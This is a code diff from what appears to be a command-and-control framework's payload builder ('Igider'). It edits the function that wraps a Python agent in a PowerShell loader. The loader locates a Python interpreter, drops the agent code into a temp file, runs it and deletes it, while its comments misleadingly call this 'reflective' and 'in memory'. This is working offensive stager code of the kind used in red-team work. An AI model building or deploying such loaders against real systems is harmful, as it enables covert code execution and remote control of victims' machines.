@@ -168,58 +168,65 @@ class Igider(PayloadType):
         return spec_content
 
 
+
     def _create_powershell_loader(self, python_code: str) -> str:
         """Create PowerShell reflective loader for Python agent."""
-        # Clean the Python code to ensure proper formatting
-        # Remove any leading/trailing whitespace from each line to prevent issues with here-strings
-        cleaned_python_code = '\n'.join(line.rstrip() for line in python_code.split('\n'))
+        import textwrap
         
-        powershell_loader = f'''# PowerShell Reflective Python Loader
-    $pythonCode = @"
+        # Clean the Python code to ensure proper formatting
+        cleaned_python_code = '\n'.join(line.rstrip() for line in python_code.split('\n'))
+
+        # Use dedent to align the string to the left
+        powershell_loader = textwrap.dedent(f'''\
+            # PowerShell Reflective Python Loader
+            $pythonCode = @"
     {cleaned_python_code}
     "@
 
-    # Check for Python installation
-    $pythonPaths = @(
-        "$env:LOCALAPPDATA\\Programs\\Python\\*\\python.exe",
-        "$env:PROGRAMFILES\\Python*\\python.exe",
-        "$env:PROGRAMFILES(X86)\\Python*\\python.exe",
-        "python.exe"
-    )
+            # Check for Python installation
+            $pythonPaths = @(
+                "$env:LOCALAPPDATA\\Programs\\Python\\*\\python.exe",
+                "$env:PROGRAMFILES\\Python*\\python.exe",
+                "$env:PROGRAMFILES(X86)\\Python*\\python.exe",
+                "python.exe"
+            )
 
-    $pythonExe = $null
-    foreach ($path in $pythonPaths) {{
-        try {{
-            $resolved = Get-Command $path -ErrorAction SilentlyContinue
-            if ($resolved) {{
-                $pythonExe = $resolved.Source
-                break
+            $pythonExe = $null
+            foreach ($path in $pythonPaths) {{
+                try {{
+                    $resolved = Get-Command $path -ErrorAction SilentlyContinue
+                    if ($resolved) {{
+                        $pythonExe = $resolved.Source
+                        break
+                    }}
+                }} catch {{}}
             }}
-        }} catch {{}}
-    }}
 
-    if (-not $pythonExe) {{
-        # Fallback: Try to download and run portable Python or use IronPython
-        Write-Host "Python not found, attempting alternative execution..."
-        
-        # Alternative 1: Use built-in .NET to execute Python-like logic
-        Add-Type -AssemblyName System.Net.Http
-        
-        # Alternative 2: Convert critical parts to PowerShell
-        # This would require translating the Python agent logic
-        exit 1
-    }}
+            if (-not $pythonExe) {{
+                # Fallback: Try to download and run portable Python or use IronPython
+                Write-Host "Python not found, attempting alternative execution..."
 
-    # Execute Python code in memory
-    $tempFile = [System.IO.Path]::GetTempFileName() + ".py"
-    $pythonCode | Out-File -FilePath $tempFile -Encoding UTF8
+                # Alternative 1: Use built-in .NET to execute Python-like logic
+                Add-Type -AssemblyName System.Net.Http
 
-    try {{
-        & $pythonExe $tempFile
-    }} finally {{
-        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
-    }}'''
+                # Alternative 2: Convert critical parts to PowerShell
+                # This would require translating the Python agent logic
+                exit 1
+            }}
+
+            # Execute Python code in memory
+            $tempFile = [System.IO.Path]::GetTempFileName() + ".py"
+            $pythonCode | Out-File -FilePath $tempFile -Encoding UTF8
+
+            try {{
+                & $pythonExe $tempFile
+            }} finally {{
+                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+            }}
+        ''')
+
         return powershell_loader
+
     
 
     async def _build_executable(self, code: str, target_os: str) -> bytes:
